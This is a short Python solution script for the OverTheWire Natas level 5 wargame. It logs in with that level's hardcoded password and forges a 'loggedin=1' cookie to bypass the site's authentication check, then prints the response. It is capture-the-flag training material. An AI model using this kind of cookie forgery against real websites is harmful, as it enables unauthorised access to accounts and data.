#!/bin/python3
import requests

username = "natas5"
password = "Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD"
headers = { 'Referer': 'http://natas6.natas.labs.overthewire.org/', 'username': username, 'password': password}
cookies = dict(loggedin='1')
r = requests.get('http://natas5.natas.labs.overthewire.org', auth=(username, password), cookies=cookies)
print(r.headers)
print(r.text)
